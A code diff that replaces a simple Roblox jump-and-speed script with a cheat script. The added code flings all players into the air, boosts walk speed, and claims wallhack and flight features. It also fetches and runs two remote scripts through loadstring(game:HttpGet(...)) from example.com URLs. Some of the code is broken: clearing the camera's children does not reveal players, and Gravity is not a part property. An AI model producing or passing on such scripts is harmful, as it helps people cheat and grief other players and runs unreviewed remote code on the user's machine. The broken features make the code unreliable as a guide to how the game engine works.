@@ -1,37 +1,33 @@
-local Players = game:GetService("Players")
-local UIS = game:GetService("UserInputService")
-
-local player = Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoid = character:WaitForChild("Humanoid")
-
-local JUMP_POWER = 50
-local JUMP_COOLDOWN = 0.2
-local canJump = true
-
-UIS.JumpRequest:Connect(function()
-    if not canJump then return end
-    if humanoid:GetState() == Enum.HumanoidStateType.Dead then return end
-    
-    canJump = false
-    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-    
-    if character:FindFirstChild("HumanoidRootPart") then
-        character.HumanoidRootPart.Velocity = Vector3.new(
-            character.HumanoidRootPart.Velocity.X,
-            JUMP_POWER,
-            character.HumanoidRootPart.Velocity.Z
-        )
+for _, player in ipairs(game.Players:GetPlayers()) do
+    if player.Character then
+        local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
+        if humanoidRootPart then
+            humanoidRootPart.Velocity = Vector3.new(0, 100, 0) -- 甩飞所有人
+        end
     end
-    
-    task.wait(JUMP_COOLDOWN)
-    canJump = true
-end)
+end
 
-local WALK_SPEED = 100
-humanoid.WalkSpeed = WALK_SPEED
+local player = game.Players.LocalPlayer
+if player.Character then
+    local humanoid = player.Character:FindFirstChild("Humanoid")
+    if humanoid then
+        humanoid.WalkSpeed = 50 -- 设置移动速度
+    end
+end
 
-player.CharacterAdded:Connect(function(newCharacter)
-    local newHumanoid = newCharacter:WaitForChild("Humanoid")
-    newHumanoid.WalkSpeed = WALK_SPEED
-end)
+game:GetService("Workspace").CurrentCamera:ClearAllChildren() -- 透视玩家
+
+local player = game.Players.LocalPlayer
+local character = player.Character
+if character then
+    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+    if humanoidRootPart then
+        humanoidRootPart.Velocity = Vector3.new(0, 0, 0) -- 飞行功能
+        humanoidRootPart.Gravity = 0
+    end
+end
+
+loadstring(game:HttpGet("https://example.com/inkgame.lua"))() -- 墨水游戏脚本
+
+getgenv().XiaoPi="1002100032" -- 皮脚本
+loadstring(game:HttpGet("https://example.com/piscript.lua"))()
